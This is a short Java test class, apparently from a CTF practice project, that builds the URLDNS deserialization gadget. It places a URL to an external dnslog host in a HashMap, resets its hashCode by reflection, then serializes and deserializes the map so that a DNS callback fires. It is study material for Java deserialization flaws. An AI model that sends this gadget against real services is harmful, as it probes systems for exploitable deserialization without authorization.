package com.ctfjava.main;

import com.ctfjava.entity.User;
import com.ctfjava.util.SerializeUtil;

import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URISyntaxException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class TestMain {
    public static void main(String[] args) throws MalformedURLException, URISyntaxException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        Map hashmap=new HashMap();
        URL url=new URL("http://7onk2k.dnslog.cn");
        Field field=Class.forName("java.net.URL").getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(url,1);

        hashmap.put(url,"ctfjava");

        field.set(url,-1);
        byte[] data= SerializeUtil.serialize(hashmap);
        SerializeUtil.unSerialize(data);  ////触发了hashmap的readObject

    }
}
